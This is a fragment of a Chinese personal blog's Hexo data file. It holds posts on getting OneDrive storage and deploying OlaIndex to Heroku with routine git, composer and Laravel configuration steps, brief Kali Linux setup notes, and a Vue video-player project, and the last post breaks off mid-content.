id=\"3-Office-365-E5-开发人员订阅\"><a href=\"#3-Office-365-E5-开发人员订阅\" class=\"headerlink\" title=\"3. Office 365 E5 开发人员订阅\"></a>3. Office 365 E5 开发人员订阅</h3><p>针对开发人员的优惠订阅，缺点是<em>你的订阅可使用 90 天，并且基于有效开发人员活动续订。 如果正在将订阅用于开发，订阅将每 3 个月续订一次，可以无限期延期</em>。而且网上目前也没有<em>有效开发人员活动</em>的具体定义，因此存在被突然停用的风险。</p>\n<h3 id=\"4-第三方买家购买\"><a href=\"#4-第三方买家购买\" class=\"headerlink\" title=\"4. 第三方买家购买\"></a>4. 第三方买家购买</h3><p>价格不会很高，但是这种帐号的来源乱七八糟，需要自己辨别。最重要的这种帐号的管理员肯定能够浏览你个人存储的数据，有一定的数据泄露风险。</p>\n<h1 id=\"OnedriveCMD\"><a href=\"#OnedriveCMD\" class=\"headerlink\" title=\"OnedriveCMD\"></a>OnedriveCMD</h1><p>OneDriveCMD 是一个 Onedrive 的命令行版本，可以通过命令行进行文件的上传和下载。</p>\n<p>推荐安装 Python 3.x 版本的 OnedriveCMD，能够有效的处理中文字符串，避免一些问题。</p>\n<p>如果存在多个账户，可以利用 <code>onedrive -conf config.json</code> 来指定所使用的配置文件，实现多个账户。</p>\n<p>如果觉得命令行使用局限性太多，可以使用 rclone 将 Onedrive 挂载到本地目录上，深度整合如操作系统。</p>\n<h1 id=\"OlaIndex\"><a href=\"#OlaIndex\" class=\"headerlink\" title=\"OlaIndex\"></a>OlaIndex</h1><p>OlaIndex 是一个提供 Onedrive 在线文件目录访问的服务，能够直接下载上传文件，并在线观看视频。</p>\n<p>之前网络上最常用教程的是使用 Now.sh 在线搭建 OneIndex，但是随着 Now.sh 逐渐下线对 Docker 容器的支持，架构切换到 Serverless，并且免费用户只能部署不超过32个文件，因此基于 OneIndex 的部署方式不再可行。另外一种方法是在 Heroku 上搭建，当然也可以使用 OneIndex，但是这时发现更好的程序是 OlaIndex，加密等功能更加强大，因此切换到了这个界面是。</p>\n<h2 id=\"版本选择\"><a href=\"#版本选择\" class=\"headerlink\" title=\"版本选择\"></a>版本选择</h2><p>在写本文的时候，发现直接 OlaIndex 上的 master 分支代码存在一些问题，直接安装后遇到了 <a href=\"https://github.com/WangNingkai/OLAINDEX/issues/171\">issue-171</a> 的问题，而 release 页面下的 <a href=\"https://github.com/WangNingkai/OLAINDEX/releases/tag/v3.2.1\">3.2.1</a> 版本却缺乏密码设置，并不是 3.x 的最新版，最后发现 <a href=\"https://github.com/WangNingkai/OLAINDEX/tree/release\">release 分支</a> 才是 3.x 版本的可用分支，这里不得不吐槽下作者的混乱管理。</p>\n<p>4.x 版本有较大更改，因此下文一些信息可能就不适用。</p>\n<h2 id=\"部署过程\"><a href=\"#部署过程\" class=\"headerlink\" title=\"部署过程\"></a>部署过程</h2><p>网上也有一些相关的部署文档，但是试用下来却发现仍然有一定的错误，所以再详细记录下安装过程:</p>\n<ol>\n<li>构建本地环境</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone --depth=1 -b release https://github.com/WangNingkai/OLAINDEX.git</span><br><span class=\"line\">cd OLAINDEX</span><br><span class=\"line\">rm -rf .git</span><br><span class=\"line\">composer install -vvv</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>配置 heroku 环境</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git init</span><br><span class=\"line\">echo web: vendor/bin/heroku-php-apache2 public/ &gt; Procfile</span><br><span class=\"line\">git add -f composer.lock</span><br><span class=\"line\">heroku create</span><br><span class=\"line\">heroku buildpacks:set heroku/php</span><br><span class=\"line\">git push heroku master</span><br><span class=\"line\">heroku config:set APP_KEY=xxx</span><br><span class=\"line\">heroku config:set APP_URL=xxx</span><br><span class=\"line\">cp .env.example .env</span><br></pre></td></tr></table></figure>\n\n<p>修改 <code>.env</code> 文件中的环境变量，URL、KEY 信息，注释掉文件中的 redis 配置。</p>\n<blockquote>\n<p>APP_ENV&#x3D;production<br>APP_KEY&#x3D;XXX<br>APP_DEBUG&#x3D;false<br>APP_URL&#x3D;<a href=\"https://xxx.herokuapp.com/\">https://XXX.herokuapp.com</a></p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git add -f .env</span><br><span class=\"line\">git add .</span><br><span class=\"line\">git commit -m &quot;init&quot;</span><br><span class=\"line\">git push heroku master</span><br></pre></td></tr></table></figure>\n\n<p>执行 <code>heroku create</code> 后就能够看到自动分配的网址了，如果不满意可以执行 <code>heroku rename XXX</code> 来修改这个网址。</p>\n<h2 id=\"保存设置\"><a href=\"#保存设置\" class=\"headerlink\" title=\"保存设置\"></a>保存设置</h2><p>heroku 的应用策略是默认是隔一段时间会自动休眠，这样一段时间没有访问后，应用会重新打开并需要重新初始化，网上有一个方法是运行命令：</p>\n<p><code>heroku run bash</code></p>\n<p>然后进入运行环境后，保存 <code>storage/app/config.json</code> 文件。但是我实际进入后，没有发现有什么保存的文件，因此失败。</p>\n<p>因此我选择的方法是先在本地跑了一个 Docker 服务（避免搭建环境），然后初始化网站，注意因为是本地 Docker，所以没有 HTTPS 域名，需要利用中转 HTTPS 域名进行中转才行，这也是这种方法的一个小隐患。初始化完成后进入 Docker 后保存 <code>storage/app/config.json</code> 到项目目录中，再次提交。这样就算每次重置了应用，也可以利用保存的会话信息跳过初始化过程。</p>\n<h2 id=\"其他配置\"><a href=\"#其他配置\" class=\"headerlink\" title=\"其他配置\"></a>其他配置</h2><p>部署完成后，发现虽然首页是 HTTPS 的，但是里面的链接都是 HTTP 链接，只不过打开后会自动跳转到对应的 HTTPS 链接而已，在密码框输入时 Firefox 也会提醒流量未加密。这是因为在使用负载均衡器的情况下，Laravel 接收到的来源是非加密流量，所以需要修改文件 <code>app\\Http\\Middleware\\TrustProxies.php</code>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">namespace App\\Http\\Middleware;</span><br><span class=\"line\">use Illuminate\\Http\\Request;</span><br><span class=\"line\">use Fideloper\\Proxy\\TrustProxies as Middleware;</span><br><span class=\"line\">class TrustProxies extends Middleware</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    protected $proxies = &#x27;*&#x27;;</span><br><span class=\"line\">    protected $headers = Request:: HEADER_X_FORWARDED_AWS_ELB;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h1><ul>\n<li><p><a href=\"https://www.microsoft.com/zh-cn/education/products/office\">Office 365 教育版</a></p>\n</li>\n<li><p><a href=\"https://docs.microsoft.com/zh-cn/office/developer-program/subscription-expiration-and-renewal\">Office 365 开发人员计划订阅到期和续订</a></p>\n</li>\n<li><p><a href=\"https://www.ouyangsong.com/posts/43735/\">now.sh 免费部署 oneindex</a></p>\n</li>\n<li><p><a href=\"https://github.com/WangNingkai/OLAINDEX/issues/63\">关于在 Heroku 部署时 HTTPS 的跳转</a></p>\n</li>\n<li><p><a href=\"https://devcenter.heroku.com/articles/getting-started-with-laravel#trusting-the-load-balancer\">getting-started-with-laravel#trusting-the-load-balancer</a></p>\n</li>\n<li><p><a href=\"https://www.abbeyok.com/archives/266\">【sharepoint】解读onedrive每天流量限制</a></p>\n</li>\n</ul>\n","excerpt":"","more":"<h1 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h1><p>Onedrive 是微软提供的一个共享网盘服务。随着 360 云盘的下线和百度云盘的下载限速，国内好用的网盘越来越少。之前也找过不少的软件实现百度云盘的高速下载，但是最近已经被屏蔽的差不多了，唯一的方法是购买 SVIP 帐号了，评估之下觉得还是需要将自己搜集的大部分公用数据分散转移，因此选择了 Onedrive 进行存储。</p>\n<p>最初的 Onedrive 国内下载速度较慢，但是目前经过网络优化，下载速度提高了很多，大文件的下载速度能够接受，甚至看到有些人直接利用 Onedrive 做视频点播。最主要的一点是很多人基于 Office 的开放 API 实现了很多基于 Onedrive 的程序，大大提高了可用性，使得我这样不经常使用 Windows 的人也能够受益其中。</p>\n<h1 id=\"申请帐号相关\"><a href=\"#申请帐号相关\" class=\"headerlink\" title=\"申请帐号相关\"></a>申请帐号相关</h1><p>注册 Onedrive 的，按照安全与可持久性的原则列出如下：</p>\n<h3 id=\"1-个人-家庭订阅-Office-365\"><a href=\"#1-个人-家庭订阅-Office-365\" class=\"headerlink\" title=\"1. 个人&#x2F;家庭订阅 Office 365\"></a>1. 个人&#x2F;家庭订阅 Office 365</h3><p>最可靠的渠道，个人版 398元&#x2F;年一个用户，家庭版 498元&#x2F;年六个用户，有一定的经济成本。</p>\n<h3 id=\"2-Office-365-教育版\"><a href=\"#2-Office-365-教育版\" class=\"headerlink\" title=\"2. Office 365 教育版\"></a>2. Office 365 教育版</h3><p>使用与微软合作的大学的edu邮箱可以注册。这个限制在于并不是所有的学校都在范围内，因此需要你查看学校的具体情况。此外根据微软的条款，虽然毕业后可以继续使用，但是微软官方的说明是<em>我们可能会随时验证您是否符合条件</em>。注意可以选择注册为教职员工来规避这一点，此外学校管理员可以看到个人存储的数据。</p>\n<h3 id=\"3-Office-365-E5-开发人员订阅\"><a href=\"#3-Office-365-E5-开发人员订阅\" class=\"headerlink\" title=\"3. Office 365 E5 开发人员订阅\"></a>3. Office 365 E5 开发人员订阅</h3><p>针对开发人员的优惠订阅，缺点是<em>你的订阅可使用 90 天，并且基于有效开发人员活动续订。 如果正在将订阅用于开发，订阅将每 3 个月续订一次，可以无限期延期</em>。而且网上目前也没有<em>有效开发人员活动</em>的具体定义，因此存在被突然停用的风险。</p>\n<h3 id=\"4-第三方买家购买\"><a href=\"#4-第三方买家购买\" class=\"headerlink\" title=\"4. 第三方买家购买\"></a>4. 第三方买家购买</h3><p>价格不会很高，但是这种帐号的来源乱七八糟，需要自己辨别。最重要的这种帐号的管理员肯定能够浏览你个人存储的数据，有一定的数据泄露风险。</p>\n<h1 id=\"OnedriveCMD\"><a href=\"#OnedriveCMD\" class=\"headerlink\" title=\"OnedriveCMD\"></a>OnedriveCMD</h1><p>OneDriveCMD 是一个 Onedrive 的命令行版本，可以通过命令行进行文件的上传和下载。</p>\n<p>推荐安装 Python 3.x 版本的 OnedriveCMD，能够有效的处理中文字符串，避免一些问题。</p>\n<p>如果存在多个账户，可以利用 <code>onedrive -conf config.json</code> 来指定所使用的配置文件，实现多个账户。</p>\n<p>如果觉得命令行使用局限性太多，可以使用 rclone 将 Onedrive 挂载到本地目录上，深度整合如操作系统。</p>\n<h1 id=\"OlaIndex\"><a href=\"#OlaIndex\" class=\"headerlink\" title=\"OlaIndex\"></a>OlaIndex</h1><p>OlaIndex 是一个提供 Onedrive 在线文件目录访问的服务，能够直接下载上传文件，并在线观看视频。</p>\n<p>之前网络上最常用教程的是使用 Now.sh 在线搭建 OneIndex，但是随着 Now.sh 逐渐下线对 Docker 容器的支持，架构切换到 Serverless，并且免费用户只能部署不超过32个文件，因此基于 OneIndex 的部署方式不再可行。另外一种方法是在 Heroku 上搭建，当然也可以使用 OneIndex，但是这时发现更好的程序是 OlaIndex，加密等功能更加强大，因此切换到了这个界面是。</p>\n<h2 id=\"版本选择\"><a href=\"#版本选择\" class=\"headerlink\" title=\"版本选择\"></a>版本选择</h2><p>在写本文的时候，发现直接 OlaIndex 上的 master 分支代码存在一些问题，直接安装后遇到了 <a href=\"https://github.com/WangNingkai/OLAINDEX/issues/171\">issue-171</a> 的问题，而 release 页面下的 <a href=\"https://github.com/WangNingkai/OLAINDEX/releases/tag/v3.2.1\">3.2.1</a> 版本却缺乏密码设置，并不是 3.x 的最新版，最后发现 <a href=\"https://github.com/WangNingkai/OLAINDEX/tree/release\">release 分支</a> 才是 3.x 版本的可用分支，这里不得不吐槽下作者的混乱管理。</p>\n<p>4.x 版本有较大更改，因此下文一些信息可能就不适用。</p>\n<h2 id=\"部署过程\"><a href=\"#部署过程\" class=\"headerlink\" title=\"部署过程\"></a>部署过程</h2><p>网上也有一些相关的部署文档，但是试用下来却发现仍然有一定的错误，所以再详细记录下安装过程:</p>\n<ol>\n<li>构建本地环境</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone --depth=1 -b release https://github.com/WangNingkai/OLAINDEX.git</span><br><span class=\"line\">cd OLAINDEX</span><br><span class=\"line\">rm -rf .git</span><br><span class=\"line\">composer install -vvv</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>配置 heroku 环境</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git init</span><br><span class=\"line\">echo web: vendor/bin/heroku-php-apache2 public/ &gt; Procfile</span><br><span class=\"line\">git add -f composer.lock</span><br><span class=\"line\">heroku create</span><br><span class=\"line\">heroku buildpacks:set heroku/php</span><br><span class=\"line\">git push heroku master</span><br><span class=\"line\">heroku config:set APP_KEY=xxx</span><br><span class=\"line\">heroku config:set APP_URL=xxx</span><br><span class=\"line\">cp .env.example .env</span><br></pre></td></tr></table></figure>\n\n<p>修改 <code>.env</code> 文件中的环境变量，URL、KEY 信息，注释掉文件中的 redis 配置。</p>\n<blockquote>\n<p>APP_ENV&#x3D;production<br>APP_KEY&#x3D;XXX<br>APP_DEBUG&#x3D;false<br>APP_URL&#x3D;<a href=\"https://xxx.herokuapp.com/\">https://XXX.herokuapp.com</a></p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git add -f .env</span><br><span class=\"line\">git add .</span><br><span class=\"line\">git commit -m &quot;init&quot;</span><br><span class=\"line\">git push heroku master</span><br></pre></td></tr></table></figure>\n\n<p>执行 <code>heroku create</code> 后就能够看到自动分配的网址了，如果不满意可以执行 <code>heroku rename XXX</code> 来修改这个网址。</p>\n<h2 id=\"保存设置\"><a href=\"#保存设置\" class=\"headerlink\" title=\"保存设置\"></a>保存设置</h2><p>heroku 的应用策略是默认是隔一段时间会自动休眠，这样一段时间没有访问后，应用会重新打开并需要重新初始化，网上有一个方法是运行命令：</p>\n<p><code>heroku run bash</code></p>\n<p>然后进入运行环境后，保存 <code>storage/app/config.json</code> 文件。但是我实际进入后，没有发现有什么保存的文件，因此失败。</p>\n<p>因此我选择的方法是先在本地跑了一个 Docker 服务（避免搭建环境），然后初始化网站，注意因为是本地 Docker，所以没有 HTTPS 域名，需要利用中转 HTTPS 域名进行中转才行，这也是这种方法的一个小隐患。初始化完成后进入 Docker 后保存 <code>storage/app/config.json</code> 到项目目录中，再次提交。这样就算每次重置了应用，也可以利用保存的会话信息跳过初始化过程。</p>\n<h2 id=\"其他配置\"><a href=\"#其他配置\" class=\"headerlink\" title=\"其他配置\"></a>其他配置</h2><p>部署完成后，发现虽然首页是 HTTPS 的，但是里面的链接都是 HTTP 链接，只不过打开后会自动跳转到对应的 HTTPS 链接而已，在密码框输入时 Firefox 也会提醒流量未加密。这是因为在使用负载均衡器的情况下，Laravel 接收到的来源是非加密流量，所以需要修改文件 <code>app\\Http\\Middleware\\TrustProxies.php</code>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">namespace App\\Http\\Middleware;</span><br><span class=\"line\">use Illuminate\\Http\\Request;</span><br><span class=\"line\">use Fideloper\\Proxy\\TrustProxies as Middleware;</span><br><span class=\"line\">class TrustProxies extends Middleware</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    protected $proxies = &#x27;*&#x27;;</span><br><span class=\"line\">    protected $headers = Request:: HEADER_X_FORWARDED_AWS_ELB;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h1><ul>\n<li><p><a href=\"https://www.microsoft.com/zh-cn/education/products/office\">Office 365 教育版</a></p>\n</li>\n<li><p><a href=\"https://docs.microsoft.com/zh-cn/office/developer-program/subscription-expiration-and-renewal\">Office 365 开发人员计划订阅到期和续订</a></p>\n</li>\n<li><p><a href=\"https://www.ouyangsong.com/posts/43735/\">now.sh 免费部署 oneindex</a></p>\n</li>\n<li><p><a href=\"https://github.com/WangNingkai/OLAINDEX/issues/63\">关于在 Heroku 部署时 HTTPS 的跳转</a></p>\n</li>\n<li><p><a href=\"https://devcenter.heroku.com/articles/getting-started-with-laravel#trusting-the-load-balancer\">getting-started-with-laravel#trusting-the-load-balancer</a></p>\n</li>\n<li><p><a href=\"https://www.abbeyok.com/archives/266\">【sharepoint】解读onedrive每天流量限制</a></p>\n</li>\n</ul>\n"},{"title":"KaliLinux使用心得","date":"2015-04-12T19:33:10.000Z","_content":"\n## Kali Linux\n\nKali是一个专门用来进行安全审计（渗透测试）的操作系统，是著名的Backtrack的后继者，由同一组开发人员开发的。Kali基于Debian系统，加入了大量的安全工具。\n\n## 基本配置\n\n### 安装Linux Brew\n\n### 允许使用PPA库\n\n参考网页[Kali Linux add PPA repository add-apt-repository](http://www.blackmoreops.com/2014/02/21/kali-linux-add-ppa-repository-add-apt-repository/)\n\n## 一些常用软件\n\n### 安装Zsh、Terminator\n\n用于替换原有的bash、Gnome Terminal。\n\n### 安装VMware\n\nVmware Workstation的驱动对于不同的Linux内核版本都要进行一定的patch才能正常编译。基本上通过搜索能够获取最新需要修改的地方，然后重新打包后编译即可。\n","source":"_posts/KaliLinux.md","raw":"title: \"KaliLinux使用心得\"\ndate: 2015-04-12 19:33:10\ntags: [\"Linux\"]\n---\n\n## Kali Linux\n\nKali是一个专门用来进行安全审计（渗透测试）的操作系统，是著名的Backtrack的后继者，由同一组开发人员开发的。Kali基于Debian系统，加入了大量的安全工具。\n\n## 基本配置\n\n### 安装Linux Brew\n\n### 允许使用PPA库\n\n参考网页[Kali Linux add PPA repository add-apt-repository](http://www.blackmoreops.com/2014/02/21/kali-linux-add-ppa-repository-add-apt-repository/)\n\n## 一些常用软件\n\n### 安装Zsh、Terminator\n\n用于替换原有的bash、Gnome Terminal。\n\n### 安装VMware\n\nVmware Workstation的驱动对于不同的Linux内核版本都要进行一定的patch才能正常编译。基本上通过搜索能够获取最新需要修改的地方，然后重新打包后编译即可。\n","slug":"KaliLinux","published":1,"updated":"2020-09-07T02:31:06.567Z","comments":1,"layout":"post","photos":[],"_id":"clypxqmmt000sxrn59eevck4i","content":"<h2 id=\"Kali-Linux\"><a href=\"#Kali-Linux\" class=\"headerlink\" title=\"Kali Linux\"></a>Kali Linux</h2><p>Kali是一个专门用来进行安全审计（渗透测试）的操作系统，是著名的Backtrack的后继者，由同一组开发人员开发的。Kali基于Debian系统，加入了大量的安全工具。</p>\n<h2 id=\"基本配置\"><a href=\"#基本配置\" class=\"headerlink\" title=\"基本配置\"></a>基本配置</h2><h3 id=\"安装Linux-Brew\"><a href=\"#安装Linux-Brew\" class=\"headerlink\" title=\"安装Linux Brew\"></a>安装Linux Brew</h3><h3 id=\"允许使用PPA库\"><a href=\"#允许使用PPA库\" class=\"headerlink\" title=\"允许使用PPA库\"></a>允许使用PPA库</h3><p>参考网页<a href=\"http://www.blackmoreops.com/2014/02/21/kali-linux-add-ppa-repository-add-apt-repository/\">Kali Linux add PPA repository add-apt-repository</a></p>\n<h2 id=\"一些常用软件\"><a href=\"#一些常用软件\" class=\"headerlink\" title=\"一些常用软件\"></a>一些常用软件</h2><h3 id=\"安装Zsh、Terminator\"><a href=\"#安装Zsh、Terminator\" class=\"headerlink\" title=\"安装Zsh、Terminator\"></a>安装Zsh、Terminator</h3><p>用于替换原有的bash、Gnome Terminal。</p>\n<h3 id=\"安装VMware\"><a href=\"#安装VMware\" class=\"headerlink\" title=\"安装VMware\"></a>安装VMware</h3><p>Vmware Workstation的驱动对于不同的Linux内核版本都要进行一定的patch才能正常编译。基本上通过搜索能够获取最新需要修改的地方，然后重新打包后编译即可。</p>\n","excerpt":"","more":"<h2 id=\"Kali-Linux\"><a href=\"#Kali-Linux\" class=\"headerlink\" title=\"Kali Linux\"></a>Kali Linux</h2><p>Kali是一个专门用来进行安全审计（渗透测试）的操作系统，是著名的Backtrack的后继者，由同一组开发人员开发的。Kali基于Debian系统，加入了大量的安全工具。</p>\n<h2 id=\"基本配置\"><a href=\"#基本配置\" class=\"headerlink\" title=\"基本配置\"></a>基本配置</h2><h3 id=\"安装Linux-Brew\"><a href=\"#安装Linux-Brew\" class=\"headerlink\" title=\"安装Linux Brew\"></a>安装Linux Brew</h3><h3 id=\"允许使用PPA库\"><a href=\"#允许使用PPA库\" class=\"headerlink\" title=\"允许使用PPA库\"></a>允许使用PPA库</h3><p>参考网页<a href=\"http://www.blackmoreops.com/2014/02/21/kali-linux-add-ppa-repository-add-apt-repository/\">Kali Linux add PPA repository add-apt-repository</a></p>\n<h2 id=\"一些常用软件\"><a href=\"#一些常用软件\" class=\"headerlink\" title=\"一些常用软件\"></a>一些常用软件</h2><h3 id=\"安装Zsh、Terminator\"><a href=\"#安装Zsh、Terminator\" class=\"headerlink\" title=\"安装Zsh、Terminator\"></a>安装Zsh、Terminator</h3><p>用于替换原有的bash、Gnome Terminal。</p>\n<h3 id=\"安装VMware\"><a href=\"#安装VMware\" class=\"headerlink\" title=\"安装VMware\"></a>安装VMware</h3><p>Vmware Workstation的驱动对于不同的Linux内核版本都要进行一定的patch才能正常编译。基本上通过搜索能够获取最新需要修改的地方，然后重新打包后编译即可。</p>\n"},{"title":"Vue入门：搭建在线视频播放","date":"2020-09-06T14:39:48.000Z","_content":"\n## 起因\n\n一些常看的视频 APP 或者网站广告太多，逐一写广告屏蔽规则过于麻烦，但是播放地址却很好发现，能够直接爬取下来，因此想着直接做一个简单的视频播放网页，顺带学习一下 Vue。\n\n## 搭建基础开发环境\n\n```\nbrew install node        // Mac 下使用 Homebrew 安装 node\nnpm install -g crm       // 安装源管理工具，加速下载\nnpm install -g @vue/cli  // 安装 vue-cli\nvue create video-sea     // 创建项目\ncd video-sea\nnpm run serve            // 启动服务\n```\n\n## 内容开发\n\n为了减少开发工作量，使用 ElementUI\n\n```\nvue add element         // 添加 Element UI \nvue add route           // 添加 vue route\n```\n\n因为我选择的是按需加载模式，所以在使用每个组件前需要手动加载\n\n```\nimport { Button, Radio } from 'element-ui'\n\nVue.use(Button)\nVue.use(Radio)\n```\n\n注意：已经不需要写分号了。","source":"_posts/Learn-Vue.md","raw":"title: \"Vue入门：搭建在线视频播放\"\ndate: 2020-09-06 14:39:48\ntags:\n---\n\n## 起因\n\n一些常看的视频 APP 或者网站广告太多，逐一写广告屏蔽规则过于麻烦，但是播放地址却很好发现，能够直接爬取下来，因此想着直接做一个简单的视频播放网页，顺带学习一下 Vue。\n\n## 搭建基础开发环境\n\n```\nbrew install node        // Mac 下使用 Homebrew 安装 node\nnpm install -g crm       // 安装源管理工具，加速下载\nnpm install -g @vue/cli  // 安装 vue-cli\nvue create video-sea     // 创建项目\ncd video-sea\nnpm run serve            // 启动服务\n```\n\n## 内容开发\n\n为了减少开发工作量，使用 ElementUI\n\n```\nvue add element         // 添加 Element UI \nvue add route           // 添加 vue route\n```\n\n因为我选择的是按需加载模式，所以在使用每个组件前需要手动加载\n\n```\nimport { Button, Radio } from 'element-ui'\n\nVue.use(Button)\nVue.use(Radio)\n```\n\n注意：已经不需要写分号了。","slug":"Learn-Vue","published":1,"updated":"2020-09-14T08:38:56.727Z","comments":1,"layout":"post","photos":[],"_id":"clypxqmmt000uxrn5bd5v68p9","content":"<h2 id=\"起因\"><a href=\"#起因\" class=\"headerlink\" title=\"起因\"></a>起因</h2><p>一些常看的视频 APP 或者网站广告太多，逐一写广告屏蔽规则过于麻烦，但是播放地址却很好发现，能够直接爬取下来，因此想着直接做一个简单的视频播放网页，顺带学习一下 Vue。</p>\n<h2 id=\"搭建基础开发环境\"><a href=\"#搭建基础开发环境\" class=\"headerlink\" title=\"搭建基础开发环境\"></a>搭建基础开发环境</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew install node        // Mac 下使用 Homebrew 安装 node</span><br><span class=\"line\">npm install -g crm       // 安装源管理工具，加速下载</span><br><span class=\"line\">npm install -g @vue/cli  // 安装 vue-cli</span><br><span class=\"line\">vue create video-sea     // 创建项目</span><br><span class=\"line\">cd video-sea</span><br><span class=\"line\">npm run serve            // 启动服务</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"内容开发\"><a href=\"#内容开发\" class=\"headerlink\" title=\"内容开发\"></a>内容开发</h2><p>为了减少开发工作量，使用 ElementUI</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vue add element         // 添加 Element UI </span><br><span class=\"line\">vue add route           // 添加 vue route</span><br></pre></td></tr></table></figure>\n\n<p>因为我选择的是按需加载模式，所以在使用每个组件前需要手动加载</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import &#123; Button, Radio &#125; from &#x27;element-ui&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">Vue.use(Button)</span><br><span class=\"line\">Vue.use(Radio)</span><br></pre></td></tr></table></figure>\n\n<p>注意：已经不需要写分号了。</p>\n","excerpt":"","more":"<h2 id=\"起因\"><a href=\"#起因\" class=\"headerlink\" title=\"起因\"></a>起因</h2><p>一些常看的视频 APP 或者网站广告太多，逐一写广告屏蔽规则过于麻烦，但是播放地址却很好发现，能够直接爬取下来，因此想着直接做一个简单的视频播放网页，顺带学习一下 Vue。</p>\n<h2 id=\"搭建基础开发环境\"><a href=\"#搭建基础开发环境\" class=\"headerlink\" title=\"搭建基础开发环境\"></a>搭建基础开发环境</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew install node        // Mac 下使用 Homebrew 安装 node</span><br><span class=\"line\">npm install -g crm       // 安装源管理工具，加速下载</span><br><span class=\"line\">npm install -g @vue/cli  // 安装 vue-cli</span><br><span class=\"line\">vue create video-sea     // 创建项目</span><br><span class=\"line\">cd video-sea</span><br><span class=\"line\">npm run serve            // 启动服务</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"内容开发\"><a href=\"#内容开发\" class=\"headerlink\" title=\"内容开发\"></a>内容开发</h2><p>为了减少开发工作量，使用 ElementUI</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vue add element         // 添加 Element UI </span><br><span class=\"line\">vue add route           // 添加 vue route</span><br></pre></td></tr></table></figure>\n\n<p>因为我选择的是按需加载模式，所以在使用每个组件前需要手动加载</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import &#123; Button, Radio &#125; from &#x27;element-ui&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">Vue.use(Button)</span><br><span 